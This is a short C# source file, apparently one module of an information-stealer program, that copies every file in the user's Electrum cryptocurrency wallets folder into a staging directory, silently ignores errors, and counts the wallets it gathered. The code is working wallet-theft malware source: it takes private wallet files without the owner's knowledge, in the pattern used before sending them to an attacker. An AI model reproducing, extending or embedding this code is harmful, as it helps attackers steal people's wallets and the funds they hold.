using System.IO;

namespace SHARP
{
    internal class Electrum
    {
      public static string ElectrumDir = "\\Wallets\\Electrum\\";

      public static void EleStr(string directorypath)
      {
        try
        {
          foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\Electrum\\wallets").GetFiles())
          {
            Directory.CreateDirectory(directorypath + Electrum.ElectrumDir);
            file.CopyTo(directorypath + Electrum.ElectrumDir + file.Name);
          }
          ++Counting.electrum;
          ++Counting.Wallets;
        }
        catch
        {
        }
      }
    }
}
